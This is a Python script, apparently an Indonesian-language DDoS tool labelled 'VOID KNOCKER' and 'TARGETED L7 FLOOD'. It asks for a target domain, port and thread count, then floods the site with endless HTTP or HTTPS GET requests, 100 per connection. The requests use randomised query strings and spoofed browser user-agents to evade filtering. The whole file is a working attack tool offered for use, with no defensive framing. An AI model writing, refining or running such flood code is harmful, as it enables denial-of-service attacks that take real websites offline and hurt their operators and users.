import socket
import threading
import random
import os
import ssl

# --- UI VOID TEAM ---
def setup_ui():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;35m")
    print("  __      ______ _____ _____    _  __ _   _  ____   _____ _  ________ _____  ")
    print("  \ \    / / __ \_   _|  __ \  | |/ /| \ | |/ __ \ / ____| |/ /  ____|  __ \ ")
    print("   \ \  / / |  | || | | |  | | | ' / |  \| | |  | | |    | ' /| |__  | |__) |")
    print("    \ \/ /| |  | || | | |  | | |  <  | . ` | |  | | |    |  < |  __| |  _  / ")
    print("     \  / | |__| || |_| |__| | | . \ | |\  | |__| | |____| . \| |____| | \ \ ")
    print("      \/   \____/_____|_____/  |_|\_\|_| \_|\____/ \_____|_|\_\______|_|  \_\ ")
    print("\n [ PRIVATE VERSION ] [ TARGETED L7 FLOOD ] [ BY: VOID TEAM ]")
    print("\033[0m")

# --- DATABASE USER AGENTS ---
def get_ua():
    uastick = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(uastick)

def attack():
    # Menghitung target spesifik
    target_ip = socket.gethostbyname(domain)
    payload = f"GET /?void_attack={random.getrandbits(32)} HTTP/1.1\r\n" \
              f"Host: {domain}\r\n" \
              f"User-Agent: {get_ua()}\r\n" \
              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
              f"Accept-Language: en-US,en;q=0.5\r\n" \
              f"Connection: keep-alive\r\n" \
              f"Cache-Control: no-cache\r\n\r\n"
    payload = payload.encode()

    while True:
        try:
            # Membuat koneksi socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            # Jika menggunakan HTTPS (Port 443)
            if port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=domain)
            
            s.connect((target_ip, port))
            
            # Kirim ribuan request dalam satu koneksi (Brutal Mode)
            for _ in range(100):
                s.sendall(payload)
            
            s.close()
        except:
            try: s.close()
            except: pass

# --- EKSEKUSI ---
setup_ui()
domain = input("\033[1;36m [?] Masukkan Domain Target (tanpa http/https): \033[0m").replace("https://", "").replace("http://", "").split('/')[0]
port = int(input("\033[1;36m [?] Port (80 untuk HTTP / 443 untuk HTTPS): \033[0m"))
threads = int(input("\033[1;36m [?] Kekuatan (Threads) [Rekomendasi 800]: \033[0m"))

print(f"\n\033[1;31m [!] MENYERANG: {domain} lewat Port {port}...")
print(" [!] STATUS: BRUTAL KNOCKING ACTIVE \033[0m")

for i in range(threads):
    t = threading.Thread(target=attack)
    t.start()
